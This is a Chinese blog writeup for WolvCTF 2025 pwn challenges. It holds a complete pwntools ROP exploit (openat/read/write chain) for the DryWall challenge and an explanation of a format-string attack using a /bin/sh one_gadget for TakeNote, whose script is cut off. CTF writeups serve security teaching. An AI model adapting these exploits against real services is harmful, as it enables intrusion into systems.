<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>WolvCTF 2025 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta name="description" content="2025年 WolvCTF 题解"/><meta property="og:title" content="WolvCTF 2025 Writeup | 花盆"/><meta property="og:description" content="2025年 WolvCTF 题解"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/WolvCTF2025-Writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="preload" as="style" href="/style.css" type="text/css"/><link rel="preload" as="style" href="/fonts.css" type="text/css"/><link rel="stylesheet" href="/style.css" type="text/css"/><link rel="stylesheet" href="/fonts.css" type="text/css"/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="wolvctf-2025-writeup" class="scroll-target"><a href="#wolvctf-2025-writeup"><code class="hash inline-code">#</code>WolvCTF 2025 Writeup</a></h1>
<h2 id="drywall" class="scroll-target"><a href="#drywall"><code class="hash inline-code">#</code>DryWall</a></h2>
<p>orw，注意一下 <code class="inline-code">openat</code> 的第一个参数，如果使用绝对路径的话应该是 <code class="inline-code">AT_FOWD</code>，也就是 <code class="inline-code">-100</code>，对应 <code class="inline-code">0xffffff9c</code></p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./chal</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">drywall.kctf-453514-codelab.kctf.cloud</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1337</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">breakrva 0x137a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">?</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">./flag.txt</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">&#x3C;|;)</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">main_addr </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">pie </span><span style="color:#999999">=</span><span style="color:#393A34"> main_addr </span><span style="color:#AB5959">-</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">main</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"pie => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pie</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">flag_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> pie </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4050</span><br><span style="color:#393A34">pop_rax_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pie </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000000119b</span><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pie </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000000013db</span><br><span style="color:#393A34">pop_rsi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pie </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000000013d9</span><br><span style="color:#393A34">pop_rdx_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pie </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000001199</span><br><span style="color:#393A34">syscall </span><span style="color:#999999">=</span><span style="color:#393A34"> pie </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000000119d</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 280</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffff9c</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> flag_addr</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 257</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> pie </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4060</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># payload += flat([pop_rdi_ret, 3, pop_rsi_ret, pie + 0x4060, 0, pop_rdx_ret, 0x100, pop_rax_ret, 78, syscall])</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> pie </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4060</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./chal</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">drywall.kctf-453514-codelab.kctf.cloud</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1337</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">breakrva 0x137a</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">?</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./flag.txt</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">&#x3C;|;)</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">main_addr </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">pie </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> main_addr </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">main</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"pie => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">pie</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">flag_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4050</span><br><span style="color:#DBD7CAEE">pop_rax_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000000119b</span><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000000013db</span><br><span style="color:#DBD7CAEE">pop_rsi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000000013d9</span><br><span style="color:#DBD7CAEE">pop_rdx_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">0000000000001199</span><br><span style="color:#DBD7CAEE">syscall </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pie </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000000119d</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 280</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffff9c</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag_addr</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 257</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pie </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4060</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">30</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># payload += flat([pop_rdi_ret, 3, pop_rsi_ret, pie + 0x4060, 0, pop_rdx_ret, 0x100, pop_rax_ret, 78, syscall])</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rsi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pie </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4060</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdx_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rax_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> syscall</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="takenote" class="scroll-target"><a href="#takenote"><code class="hash inline-code">#</code>TakeNote</a></h2>
<p>格式化字符串，不完全是堆上的格式化字符串，因为题目先用一个栈变量存了输入的格式化字符串，再加上程序栈上找不出来两条链子，所以就还是用栈上的格式化字符串打法打。</p>
<p>这里没用 pwntools 生成，毕竟还是有长度限制的，自己手写方便点。</p>
<p>one_gadget 挑的是这个，因为注意到 <code class="inline-code">r15</code> 和 <code class="inline-code">rdx</code> 寄存器刚好是 0：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
[r15] == NULL || r15 == NULL || r15 is a valid argv
[rdx] == NULL || rdx == NULL || rdx is a valid envp
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
[r15] == NULL || r15 == NULL || r15 is a valid argv
[rdx] == NULL || rdx == NULL || rdx is a valid envp
</code></pre></div>
<p>布置栈链的时候显然得 4 字节 4 字节写入，于是得爆破一下，1/16</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./chal_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">info</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">breakrva 0x14d8</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Exit</span><span style="color:#A65E2B">\n\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">op</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> write</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">]</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span 